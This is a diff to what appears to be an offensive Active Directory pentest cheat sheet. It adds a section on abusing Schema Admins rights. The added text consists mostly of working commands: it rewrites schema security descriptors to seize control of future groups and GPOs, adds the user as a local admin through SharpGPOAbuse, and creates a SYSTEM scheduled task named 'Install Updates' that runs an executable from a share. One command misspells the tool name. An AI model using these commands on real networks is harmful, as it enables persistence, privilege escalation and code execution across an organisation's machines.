@@ -407,6 +407,55 @@ sc \\<dns server> start dns
 Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse -ErrorAction Silentlycontinue -WarningAction Silentlycontinue | Where-Object -Property MemberObjectClass -Match computer | Select-Object MemberName
 ```
 
+### Schema Admins
+#### Get User SID
+- This user will have privileges for new objects
+```
+Get-DomainUser <USER> | Select-Object samaccountname, objectsid
+```
+
+#### Modify schema - group
+- Using the `SID` of previous command
+- This will give us full control over the groups that are created **after** the modification.
+```
+Set-ADObject -Identity "CN=group,CN=Schema,CN=Configuration,DC=<DOMAIN>,DC=local" -Replace @{defaultSecurityDescriptor = 'D:(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;DA)(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;SY)(A;;RPLCLORC;;;AU)(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;<SID>)';} -Verbose
+```
+
+#### Check new groups
+```
+Get-DomainGroup | Select-Object samaccountname, whencreated
+```
+
+#### Check if user has ACL of new group
+```
+Get-DomainGroup <GROUP> | Get-DomainObjectAcl | ? {$_.SecurityIdentifier -eq "<SID USER>"}
+```
+
+#### Add members to new group
+```
+Add-ADGroupMember <GROUP> -Members <USER>
+```
+
+#### Modify schema - GPO
+```
+Set-ADObject -Identity "CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=<DOMAIN>,DC=local" -Replace @{defaultSecurityDescriptor = 'D:(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;DA)(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;SY)(A;;RPLCLORC;;;AU)(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;<SID>)';} -Verbose
+```
+
+#### Add local admin abuse
+- https://github.com/FSecureLABS/SharpGPOAbuse
+```
+./ShapGPOAbuse.exe --AddLocalAdmin --GPOName <GPONAME> --UserAccount <USERNAME>
+gpupdate /force #On the target machine if you got normal access already
+net localgroup administrators
+```
+
+#### Create scheduled task
+- https://github.com/FSecureLABS/SharpGPOAbuse
+```
+.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c <SHARE>\<EXECUTABLE FILE>" --GPOName "<GPO>"
+```
+
+
 ## Access Control List
 - It is possible to abuse permissions (ACL's)
 - `ObjectDN` = The object the permissions apply to
